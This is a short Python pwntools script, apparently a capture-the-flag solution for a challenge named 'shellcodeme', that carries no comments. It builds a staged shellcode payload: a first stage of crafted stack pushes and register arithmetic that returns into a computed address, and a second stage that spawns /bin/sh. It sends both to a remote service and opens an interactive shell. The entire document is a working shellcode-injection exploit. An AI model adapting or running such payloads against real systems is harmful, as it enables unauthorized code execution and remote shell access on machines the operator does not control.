from pwn import *

context(arch='amd64', os='linux', log_level='info')

payload = asm(("push 0x40000000; "*0x100)+("push rbx; "*36)+"push 0x400000; pop rbx; "+("inc ebx; "*0x86d)+"push rbx; ret;")
payload2 = asm(shellcraft.amd64.linux.sh())

s = remote("shellcodeme.420blaze.in", 4200)

s.sendline(payload)
s.sendline(payload2)

s.interactive()
s.close()

